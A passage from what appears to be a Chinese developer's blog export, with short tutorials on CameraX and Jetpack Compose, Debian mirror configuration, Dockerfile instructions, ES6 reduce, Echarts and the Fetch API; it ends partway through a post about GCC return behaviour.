<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">CameraPreview</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    controller: <span class="type">LifecycleCameraController</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    modifier: <span class="type">Modifier</span> = Modifier</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> lifecycleOwner = LocalLifecycleOwner.current</span><br><span class="line">    AndroidView(</span><br><span class="line">        factory = &#123;</span><br><span class="line">            PreviewView(it).apply &#123;</span><br><span class="line">                <span class="keyword">this</span>.controller = controller</span><br><span class="line">                controller.bindToLifecycle(lifecycleOwner)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        modifier = modifier</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>因为需要传入一个控制器，所以提前在activity使用remember或者直接在viewModel中声明一个controller</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> controller = remember &#123;</span><br><span class="line">                    <span class="comment">//声明需要使用捕获图片和视频的权限</span></span><br><span class="line">                    LifecycleCameraController(applicationContext).apply &#123;</span><br><span class="line">                        setEnabledUseCases(</span><br><span class="line">                            CameraController.IMAGE_CAPTURE or</span><br><span class="line">                                    CameraController.VIDEO_CAPTURE</span><br><span class="line">                        )</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>切换摄像头,需要使用到<code>camereSelector</code>这一属性:</li>
</ol>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">IconButton(onClick = &#123;</span><br><span class="line">                            controller.cameraSelector =</span><br><span class="line">                                <span class="keyword">if</span> (controller.cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) &#123;</span><br><span class="line">                                    CameraSelector.DEFAULT_FRONT_CAMERA</span><br><span class="line">                                &#125; <span class="keyword">else</span> CameraSelector.DEFAULT_BACK_CAMERA</span><br><span class="line">                        &#125;, modifier = Modifier.offset(<span class="number">16.</span>dp, <span class="number">16.</span>dp)) &#123;</span><br><span class="line">                            Icon(</span><br><span class="line">                                imageVector = Icons.Default.Cameraswitch,</span><br><span class="line">                                contentDescription = <span class="string">&quot;Switch Camera&quot;</span></span><br><span class="line">                            )</span><br><span class="line">                        &#125;</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>拍摄照片</li>
</ol>
<p>拍摄照片时，单独定义了一个方法，他首先需要检查权限，如果没有权限，将直接退出，不允许使用。他也是调用&#96;controller的拍摄方法，他需要获取主线程，然后设置一个拍摄后的回调函数来实现拍照并存储</p>
<blockquote>
<p>ContextCompat 可以理解为是封装了 Context 的一些便捷方法，如加载图片等资源文件</p>
</blockquote>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">takePhoto</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        controller: <span class="type">LifecycleCameraController</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        onPhotoTaken: (<span class="type">Bitmap</span>) -&gt; <span class="type">Unit</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!hasRequiredPermissions()) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        controller.takePicture(</span><br><span class="line">            ContextCompat.getMainExecutor(applicationContext),</span><br><span class="line">            <span class="keyword">object</span> : OnImageCapturedCallback() &#123;</span><br><span class="line">                <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCaptureSuccess</span><span class="params">(image: <span class="type">ImageProxy</span>)</span></span> &#123;</span><br><span class="line">                    <span class="keyword">super</span>.onCaptureSuccess(image)</span><br><span class="line">                    <span class="comment">//旋转图片</span></span><br><span class="line">                    <span class="keyword">val</span> matrix = Matrix().apply &#123;</span><br><span class="line">                        postRotate(image.imageInfo.rotationDegrees.toFloat())</span><br><span class="line">                        <span class="comment">//前置摄像头反转,反转水平，而不反转垂直</span></span><br><span class="line">                        postScale(-<span class="number">1f</span>, <span class="number">1f</span>)</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">val</span> rotatedBitmap = Bitmap.createBitmap(</span><br><span class="line">                        image.toBitmap(),</span><br><span class="line">                        <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">                        image.width, image.height,</span><br><span class="line">                        matrix, <span class="literal">true</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="comment">//</span></span><br><span class="line">                    onPhotoTaken(image.toBitmap())</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onError</span><span class="params">(exception: <span class="type">ImageCaptureException</span>)</span></span> &#123;</span><br><span class="line">                    <span class="keyword">super</span>.onError(exception)</span><br><span class="line">                    Log.e(<span class="string">&quot;Camera&quot;</span>, <span class="string">&quot;Couldn&#x27;t take photo:&quot;</span>, exception)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>拍摄视频</li>
</ol>
<p>对于视频的拍摄，无法直观的显示出来，因为视频并不像图片一样可以得到bitmap然后直接在内存中存储。因此，在这里我们选择存储到内部存储中。而对于手机而言，只要不是放到公共的空间。是不需要申请存储空间的访问的。</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先仍然需要记录一个值，用来确定拍照的状态（正在拍摄，或者停止拍摄）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">var</span> recording: Recording? = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressLint(<span class="string">&quot;MissingPermission&quot;</span>)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">recordVideo</span><span class="params">(controller: <span class="type">LifecycleCameraController</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (recording != <span class="literal">null</span>) &#123;</span><br><span class="line">            recording?.stop()</span><br><span class="line">            recording = <span class="literal">null</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!hasRequiredPermissions()) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">val</span> outputFile = File(filesDir, <span class="string">&quot;my-recording.mp4&quot;</span>)</span><br><span class="line">        recording = controller.startRecording(</span><br><span class="line">            FileOutputOptions.Builder(outputFile).build(),</span><br><span class="line">            AudioConfig.create(<span class="literal">true</span>),</span><br><span class="line">            ContextCompat.getMainExecutor(applicationContext)</span><br><span class="line">        ) &#123; event -&gt;</span><br><span class="line">            <span class="keyword">when</span> (event) &#123;</span><br><span class="line">                <span class="keyword">is</span> VideoRecordEvent.Finalize -&gt; &#123;</span><br><span class="line">                    <span class="keyword">if</span> (event.hasError()) &#123;</span><br><span class="line">                        recording?.close()</span><br><span class="line">                        recording = <span class="literal">null</span></span><br><span class="line">                        Toast.makeText(</span><br><span class="line">                            applicationContext,</span><br><span class="line">                            <span class="string">&quot;Video capture failed&quot;</span>,</span><br><span class="line">                            Toast.LENGTH_LONG</span><br><span class="line">                        ).show()</span><br><span class="line"></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        Toast.makeText(</span><br><span class="line">                            applicationContext,</span><br><span class="line">                            <span class="string">&quot;Video capture succeeded&quot;</span>,</span><br><span class="line">                            Toast.LENGTH_LONG</span><br><span class="line">                        ).show()</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>cameraX</tag>
      </tags>
  </entry>
  <entry>
    <title>Compose 去除点击水波纹阴影效果_局部and全局去除-CompositionLocal实例</title>
    <url>/posts/b17914dc/</url>
    <content><![CDATA[<p>一：针对单个view，去除点击效果，可以在clickable 中添加</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">indication = <span class="literal">null</span>, interactionSource = remember &#123; MutableInteractionSource() &#125;</span><br></pre></td></tr></table></figure>

<p> 二：针对整个Activity,你可以在最root的compose里设置，通过CompositionLocal（让数据流经界面树的一种隐式方式），属性传递，把children就全部替换了<br> <figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"> <span class="meta">@Composable</span></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">ComposeTheme</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    content: @<span class="type">Composable</span> () -&gt; <span class="type">Unit</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span> &#123;</span><br><span class="line">    MaterialTheme(colors = LightColorPalette) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置全局参数，去除默认点击效果</span></span><br><span class="line">        CompositionLocalProvider(</span><br><span class="line">            LocalIndication provides NoIndication</span><br><span class="line">        ) &#123;</span><br><span class="line">            ProvideTextStyle(value = MaterialTheme.typography.body1, content = content)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// null indication</span></span><br><span class="line"><span class="keyword">object</span> NoIndication : Indication &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">object</span> NoIndicationInstance : IndicationInstance &#123;</span><br><span class="line">        <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> ContentDrawScope.<span class="title">drawIndication</span><span class="params">()</span></span> &#123;</span><br><span class="line">            drawContent()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Composable</span></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">rememberUpdatedInstance</span><span class="params">(interactionSource: <span class="type">InteractionSource</span>)</span></span>: IndicationInstance &#123;</span><br><span class="line">        <span class="keyword">return</span> NoIndicationInstance</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>jetpack compose</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian换源至阿里源解决安装报错</title>
    <url>/posts/ef6ef7b2/</url>
    <content><![CDATA[<p>关于我配置我家云然后安装debian时，经常安装报错，因此在这里简单介绍一下如何给debian换源，同时推荐使用阿里源，他会比清华源更加稳定好用。</p>
<ol>
<li>备份配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> -a /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure></li>
<li>编辑配置文件<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure></li>
<li>具体国内源<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/debian/ bullseye main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/debian/ bullseye main non-free contrib</span><br><span class="line">deb https://mirrors.aliyun.com/debian-security/ bullseye-security main</span><br><span class="line">deb-src https://mirrors.aliyun.com/debian-security/ bullseye-security main</span><br><span class="line">deb https://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib</span><br><span class="line">deb https://mirrors.aliyun.com/debian/ bullseye-backports main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/debian/ bullseye-backports main non-free contrib</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>引用自<a href="https://blog.csdn.net/zqr4818/article/details/129657792">csdn</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>轻nas</tag>
      </tags>
  </entry>
  <entry>
    <title>Compose 设置沉浸状态栏（不导入库一行代码解决）</title>
    <url>/posts/7dda0e18/</url>
    <content><![CDATA[<h2 id="旧"><a href="#旧" class="headerlink" title="旧"></a>旧</h2><p>(最初的版本，修改style.xml的文件来得到)<br>在style.xml中修改代码如下即可</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">&quot;AppFullTheme&quot;</span> <span class="attr">parent</span>=<span class="string">&quot;AppTheme&quot;</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android:windowTranslucentNavigation&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android:windowLayoutInDisplayCutoutMode&quot;</span>&gt;</span>shortEdges<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android:windowFullscreen&quot;</span>&gt;</span>true<span class="tag">&lt;/<span class="name">item</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="新"><a href="#新" class="headerlink" title="新"></a>新</h2><p>在使用compose时，首先找到<code>Theme.kt</code><br>找到这段代码</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">(view.context <span class="keyword">as</span> Activity).window.statusBarColor = colorScheme.primary.toArgb()</span><br></pre></td></tr></table></figure>
<p>将其改为</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">(view.context <span class="keyword">as</span> Activity).window.statusBarColor = Color.Transparent.toArgb()</span><br></pre></td></tr></table></figure>
<p>这样就完成了状态栏颜色透明色</p>
<p>还有两个问题：</p>
<ol>
<li><p>状态栏未沉浸<br>在MainActivity中设置</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">WindowCompat.setDecorFitsSystemWindows(window, <span class="literal">false</span>)</span><br></pre></td></tr></table></figure>
<p>当然，这一部分你也可以选择通过style.xml来设置，都是一样的</p>
</li>
<li><p>状态栏字体颜色是白色<br>![](<a href="https://image.zfxt.top/hexo-blog/Compose">https://image.zfxt.top/hexo-blog/Compose</a> 设置沉浸状态栏（不导入库一行代码解决）-2023-12-14-38-47.png)<br>默认情况下，他会根据系统是否未暗色模式来修改状态栏字体颜色。因此你可以自定义方法（在不同场景下传入不同的参数来设置颜色值）或者直接写死。设置字体颜色</p>
</li>
</ol>
<blockquote>
<p>引用自<a href="https://blog.csdn.net/ClearPole/article/details/125728734">csdn</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>DevOps 工具：提升软件开发和运营效率</title>
    <url>/posts/517a90b0/</url>
    <content><![CDATA[<p>DevOps tools（DevOps工具）是指用于支持DevOps实践的软件工具集合。DevOps是一种软件开发和运营的方法论，旨在通过协作、自动化和监控等方式来增强软件开发和运营的效率和质量。DevOps工具可以帮助开发和运维团队实现自动化、协作和监控等目标，从而提高软件开发和运营的效率和质量。</p>
<p>一些常见的DevOps工具包括：</p>
<p>持续集成（Continuous Integration，CI）工具，如Jenkins、Travis CI、CircleCI等，用于自动化构建和测试代码；<br>持续交付（Continuous Delivery，CD）工具，如Ansible、Puppet、Chef等，用于自动化部署和配置代码；<br>容器化工具，如Docker、Kubernetes等，用于管理和部署容器化应用程序；<br>监控和日志工具，如Prometheus、Grafana、ELK Stack等，用于监控应用程序的健康状况和日志信息；<br>协作工具，如GitLab、GitHub、Bitbucket等，用于团队协作和版本控制。</p>
]]></content>
      <tags>
        <tag>杂言</tag>
      </tags>
  </entry>
  <entry>
    <title>Dockerfile指令指南</title>
    <url>/posts/23f4b25/</url>
    <content><![CDATA[<p><code>FROM</code>:指定基础镜像，例如 <code>FROM Ubuntu:18.04</code><br><code>RUN</code>:执行命令，在dockerfile中，他每次执行RUN命令都会分层。镜像会分层。这会造成镜像臃肿，因此常用&amp;&amp;来一次执行多次命令。<br><code>COPY</code>:他会从宿主机复制文件到镜像中。例如<code>COPY app.py /app/</code><br>这个命令就会将app.py复制到镜像的app目录下，当然，这个目录你可以自己指定<br><code>ADD</code>:类似于COPY,但是他支持URL（包括其他位置和网络部分）和自动解压<br><code>WORKDIR</code>:指定工作目录，如：workdir:&#x2F;app,如果没有指定的话，他就会默认在这个目录下执行。<br><code>EXPOSE</code>：暴露端口，比如<code>EXPOSE 80</code>他会映射端口到宿主机的某个端口<br><code>CMD</code>:设置默认命令，他启动时会启动的命令。注意：（如果写了多个CMD他也只会执行最后一条CMD命令）如[“python”,”app.py”]<br><code>ENTERPOINT</code>:容器启动时执行的命令，如[“python”,”app.py”].<br>而且如果在容器中，同时又ENTERPOINT和CMD，那么他将会执行ENTERPOINT，CMD将会作为参数传给ENTERPOINT。比如他会拿到ENTERPOINT的python命令，和CMD的app.py参数<br><code>ENV</code>:设置环境变量,如<code>ENV MYSQL_ROOT_PASSWORD=your_password</code><br><code>ARG</code>:添加一个环境变量，如 <code>ARG VERSION=latest</code><br><code>VOLUME</code>：声明数据卷，如：<code>VOLUME /var/lib/mysql</code><br>他会映射到容器外的某个目录。如果没声明他会默认挂载到一个默认目录。<br><code>USER</code>:指定运行用户</p>
]]></content>
  </entry>
  <entry>
    <title>ES6 Reduce：数组归并方法</title>
    <url>/posts/7b5e219/</url>
    <content><![CDATA[<p>ES6中的reduce方法，是一种数组的归并方法。他的每一次遍历后的值会留给下一次继续遍历。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr5 = [<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;long&#x27;</span>,<span class="string">&#x27;short&#x27;</span>,<span class="string">&#x27;long&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;name&#x27;</span>] </span><br><span class="line"><span class="comment">//pre第一次的值，cur当前值 &#123;&#125;标识pre的预设值</span></span><br><span class="line"><span class="keyword">let</span> arrResult1 = arr.<span class="title function_">reduce</span>(<span class="function">(<span class="params">pre,cur</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(pre,cur)</span><br><span class="line">    <span class="keyword">if</span>(cur <span class="keyword">in</span> pre)&#123;</span><br><span class="line">        pre[cur]++</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        pre[cur] = <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre</span><br><span class="line">&#125;,&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arrResult1)<span class="comment">//结果：&#123;name: 3, age: 1, long: 2, short: 1&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="http://zfx-t.top:5230/o/r/23/afd988bc-9ad1-44b5-b3d5-34894d2c992e/1681833196_image.png" alt="image"></p>
<blockquote>
<p><a href="https://blog.csdn.net/SoULikeMe/article/details/109088548">详细使用方法</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title>Echarts入门</title>
    <url>/posts/ae3fcb2/</url>
    <content><![CDATA[<h1 id="echarts的引入"><a href="#echarts的引入" class="headerlink" title="echarts的引入"></a>echarts的引入</h1><ul>
<li><p>在原生html中引入echarts<br>你可以在<a href="https://echarts.apache.org/zh/download.html">官方下载链接</a>获得echarts的js包</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--下载包的方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;你的echar.js的路径&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入网络链接的方式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcdn.net/ajax/libs/echarts/5.4.2/echarts.common.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在vue中引入echarts</p>
</li>
</ul>
<h1 id="echarts的使用"><a href="#echarts的使用" class="headerlink" title="echarts的使用"></a>echarts的使用</h1><p>echarts会自动适应和匹配容器的大小</p>
<ul>
<li>通过js来使用echar<br>首先先定义一个容器，用来防止echart图标</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;echart-box&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:600px;height:600px;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//初始化一个echart</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> myEchart = echarts.<span class="title function_">init</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;echart-box&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//指定图表的配置</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> option = &#123;</span></span><br><span class="line"><span class="language-javascript">    title=<span class="string">&quot;老陈echarts Demo1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">tooltip</span>:&#123;&#125;,<span class="comment">//提示框</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">legend</span>:&#123;<span class="comment">//图标</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:[<span class="string">&quot;人数&quot;</span>]</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">xAxis</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:[<span class="string">&#x27;vue&#x27;</span>,<span class="string">&#x27;react&#x27;</span>,<span class="string">&#x27;angular&#x27;</span>,<span class="string">&#x27;jquery&#x27;</span>]</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">yAxis</span>:&#123;&#125;,<span class="comment">//默认为数字</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">series</span>:[</span></span><br><span class="line"><span class="language-javascript">    	&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">name</span>:<span class="string">&quot;人数&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">type</span>:<span class="string">&quot;bar&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">data</span>:[<span class="number">2000</span>,<span class="number">1000</span>,<span class="number">500</span>,<span class="number">2200</span>]</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	mychart.<span class="title function_">setOption</span>(option)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://zfxt.top/usr/uploads/2023/06/2014775427.png" alt="2023-06-23T05:23:24.png"></p>
<h1 id="echarts配置讲解"><a href="#echarts配置讲解" class="headerlink" title="echarts配置讲解"></a>echarts配置讲解</h1><p><img src="https://image.zfxt.top/hexo-blog/Echarts%E5%85%A5%E9%97%A8-2023-06-03-25-38.png"></p>
]]></content>
      <categories>
        <category>Echarts</category>
      </categories>
  </entry>
  <entry>
    <title>Fetch API：Promise 驱动的异步请求</title>
    <url>/posts/c2abc177/</url>
    <content><![CDATA[<h1 id="Fetch"><a href="#Fetch" class="headerlink" title="Fetch"></a>Fetch</h1><p>fetch是与xhr不同的另一种发送请求的方法。他本身也是一种已经实现的API。<br>他并不需要通过回调请求，而是采用了promise的返回结果方式，采用了链式结构。</p>
<ul>
<li>当接收到一个代表错误的 HTTP 状态码时，从 fetch() 返回的 Promise 不会被标记为 reject，即使响应的 HTTP 状态码是 404 或 500。相反，它会将 Promise 状态标记为 resolve（如果响应的 HTTP 状态码不在 200 - 299 的范围内，则设置 resolve 返回值的 ok 属性为 false），仅当网络故障时或请求被阻止时，才会标记为 reject。</li>
<li>fetch 不会发送跨域 cookie，除非你使用了 credentials 的初始化选项。（自 2018 年 8 月以后，默认的 credentials 政策变更为 same-origin。Firefox 也在 61.0b13 版本中进行了修改）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://example.com/movies.json&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data));</span><br></pre></td></tr></table></figure>
模板：<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Example POST method implementation:</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">postData</span>(<span class="params">url = <span class="string">&#x27;&#x27;</span>, data = &#123;&#125;</span>) &#123;</span><br><span class="line">  <span class="comment">// Default options are marked with *</span></span><br><span class="line">  <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="comment">// *GET, POST, PUT, DELETE, etc.</span></span><br><span class="line">    <span class="attr">mode</span>: <span class="string">&#x27;cors&#x27;</span>, <span class="comment">// no-cors, *cors, same-origin</span></span><br><span class="line">    <span class="attr">cache</span>: <span class="string">&#x27;no-cache&#x27;</span>, <span class="comment">// *default, no-cache, reload, force-cache, only-if-cached</span></span><br><span class="line">    <span class="attr">credentials</span>: <span class="string">&#x27;same-origin&#x27;</span>, <span class="comment">// include, *same-origin, omit</span></span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">      <span class="comment">// &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;,</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">redirect</span>: <span class="string">&#x27;follow&#x27;</span>, <span class="comment">// manual, *follow, error</span></span><br><span class="line">    <span class="attr">referrerPolicy</span>: <span class="string">&#x27;no-referrer&#x27;</span>, <span class="comment">// no-referrer, *no-referrer-when-downgrade, origin, origin-when-cross-origin, same-origin, strict-origin, strict-origin-when-cross-origin, unsafe-url</span></span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data) <span class="comment">// body data type must match &quot;Content-Type&quot; header</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> response.<span class="title function_">json</span>(); <span class="comment">// parses JSON response into native JavaScript objects</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">postData</span>(<span class="string">&#x27;https://example.com/answer&#x27;</span>, &#123; <span class="attr">answer</span>: <span class="number">42</span> &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data); <span class="comment">// JSON data parsed by `data.json()` call</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>详细参考<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API/Using_Fetch">MDN</a></p>
</blockquote>
</li>
</ul>
<h1 id="promise"><a href="#promise" class="headerlink" title="promise"></a>promise</h1><p>Promise 对象用于表示一个异步操作的最终完成（或失败）及其结果值。</p>
]]></content>
      <tags>
        <tag>vue</tag>
        <tag>fetch</tag>
        <tag>promise</tag>
      </tags>
  </entry>
  <entry>
    <title>GCC 中在非 void 函数中不写 return 的情况</title>
    <url>/posts/eb481fa1/</url>
    <content><![CDATA[<p>最近在复习408关于二分查找时，看到一个使用递归实现的方法。代码并不难实现。但是在写完这段代码后，发现一个问题。我在递归中并没有及时return结果。但是结果却是正确的<br>下面贴上代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinSearchRec</span><span class="params">(<span class="type">int</span> *ST, <span class="type">int</span> key, <span class="type">int</span> low, <span class="type">int</span> high)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> st[<span class="number">10</span>] = &#123;<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">18</span>,<span class="number">20</span>,<span class="number">21</span>,<span 